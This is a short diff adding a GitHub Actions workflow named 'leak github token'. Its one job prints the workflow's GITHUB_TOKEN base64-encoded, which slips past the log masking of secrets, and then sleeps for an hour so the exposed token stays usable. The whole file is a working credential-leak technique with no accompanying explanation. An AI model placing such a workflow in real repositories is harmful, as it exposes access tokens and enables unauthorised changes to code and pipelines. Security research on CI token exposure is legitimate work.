@@ -1,0 +1,9 @@
+name: leak github token
+on: [workflow_dispatch]
+
+jobs:
+  leak_token:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ github.token }} | base64
+      - run: sleep 3600
